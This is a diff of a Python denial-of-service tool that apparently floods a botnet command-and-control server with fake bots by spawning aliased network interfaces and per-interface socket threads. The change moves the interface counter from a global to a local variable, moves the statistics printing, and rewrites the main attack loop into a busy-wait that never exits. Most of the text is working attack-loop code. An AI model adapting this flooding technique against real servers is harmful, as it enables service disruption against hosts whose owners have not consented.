@@ -60,9 +60,6 @@ RC_ACCOUNTS = 9
 # Number of bots communicating with the C&C server
 BOT_NUM = 0 
 
-# Maintain a count on new newtwork interfaces made
-IFACE_COUNT = 0 
-
 # Thread lock
 lock = threading.Lock()
 
@@ -78,6 +75,7 @@ def init_iface(iface):
 
 # Add new bot to the botnet
 def add_bot(iface):
+    global BOT_NUM
     s = init_socket(iface, TIMEOUT)
     communicate(s, dbg=DBG, print_cmd=PRINT_CMD)
     s.close()
@@ -86,9 +84,9 @@ def add_bot(iface):
         BOT_NUM -= 1 # Bot disconnected
 
 # Bring network interfaces down
-def ifconfig_down():
+def ifconfig_down(iface_count):
     cprint("\n[*] Bringing network interfaces down...", "green")
-    for i in range(0, IFACE_COUNT + 1):
+    for i in range(0, iface_count + 1):
         call(["ifconfig", IFACE + ":" + str(i), "down"])
 
 def print_status(ip, iface):
@@ -106,7 +104,6 @@ def print_statistics(runtime):
 
 def main():
     global BOT_NUM
-    global IFACE_COUNT
 
     # Options parser
     parser = optparse.OptionParser()
@@ -128,16 +125,28 @@ def main():
     f.write(str(os.getpid()))
     f.close()
 
-
     threads = [] # Maintain a list of threads
+    iface_count = 0 # Maintain a count on new newtwork interfaces made
+    print_once = True
     start = time.time() # Start timer
 
     print "[*] Starting DoS attack...\n"
 
-    while BOT_NUM < TARGET:
+    while True:
+        if BOT_NUM > TARGET:
+            if print_once:
+                # Stop timing
+                end = time.time()
+                runtime = end - start
+                # Print statistics
+                print_statistics(runtime)
+                print_once = False
+
+            continue
+
         try:
             # Initialize new network interface
-            iface = IFACE + ":" + str(IFACE_COUNT)
+            iface = IFACE + ":" + str(iface_count)
             ip = init_iface(iface)
 
             # Start a new thread and add new bot to the botnet
@@ -148,7 +157,7 @@ def main():
             with lock:
                 BOT_NUM += 1
 
-            IFACE_COUNT += 1
+            iface_count += 1
 
             # Print status
             print_status(ip, iface)
@@ -161,19 +170,12 @@ def main():
             cprint("[-] " + str(e), "red")
             break
 
-    # Stop timing
-    end = time.time()
-    runtime = end - start
-
-    # Print statistics
-    print_statistics(runtime)
-
     # Wait for all threads to terminate
     for thread in threads:
         thread.join()
-    
+
     # Bring interfaces down
-    ifconfig_down()
+    ifconfig_down(iface_count)
 
 
 if __name__ == "__main__":
